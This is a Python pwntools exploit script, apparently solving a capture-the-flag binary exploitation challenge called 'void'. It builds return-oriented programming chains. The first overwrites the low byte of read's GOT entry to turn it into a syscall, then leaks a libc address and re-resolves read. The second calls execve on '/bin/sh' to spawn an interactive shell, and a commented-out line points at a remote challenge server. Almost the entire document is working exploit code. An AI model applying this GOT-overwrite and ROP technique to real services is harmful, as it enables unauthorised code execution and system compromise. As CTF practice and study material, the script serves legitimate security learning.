from pwn import *


gdbscript = """
b *main
c
"""

context.binary = "./void"
padding = b'A'*72
#io = remote("165.232.108.240",30338)
io = gdb.debug("./void",gdbscript=gdbscript)

poprsir15 = p64(0x00000000004011b9)
read = p64(0x00401030)
re_resolve_read = p64(0x00401036)
vuln = p64(0x00401122)
ret = p64(0x0000000000401016)
poprdi = p64(0x00000000004011bb)



payload = [
    #Overwrite LSB of read so it becomes syscall
    padding,
    p64(0x404800-8),
    poprsir15,
    p64(0x404018),
    p64(0xdeadbeef),
    read,
    #Since LSB overwrite was one byte, RAX is now 1. Which makes it so we can leak GOT cause read becomes write
    poprsir15,
    p64(0x404018),
    p64(0xdeadbeef),
    poprdi,
    p64(0x1),
    read,
    #Jump to read plt + 6. So we can re-resolve it and restore read back to a read again
    poprdi,
    p64(0x0),
    re_resolve_read,
    vuln
]
payload = b''.join(payload)
input("Payload 2")
io.send(payload)
#Syscall is at 0x8c with LSB overwrite
input("LSB overwrite")
io.send(b'\x8c')
input("Send 1 byte")
io.send(b'\x80')


#Receive GOT leak
leak = u64(io.recv(8))
libc_base = leak-0xec78c
print(f"LIBC BASE {libc_base:#x}")

#Calc gadgets
poprsi = p64(libc_base+0x000000000002590f)
poprdx = p64(libc_base+0x00000000000c8acd)
poprax = p64(libc_base+0x000000000003be88)
syscall = p64(libc_base+0x00000000000550da)
binsh = p64(libc_base+0x00196152)


#Pop shell
payload = [
    padding,
    poprdi,
    binsh,
    poprsi,
    p64(0),
    poprdx,
    p64(0),
    poprax,
    p64(59),
    syscall
]

payload = b''.join(payload)
input("Spawn shell")
io.send(payload)


io.interactive()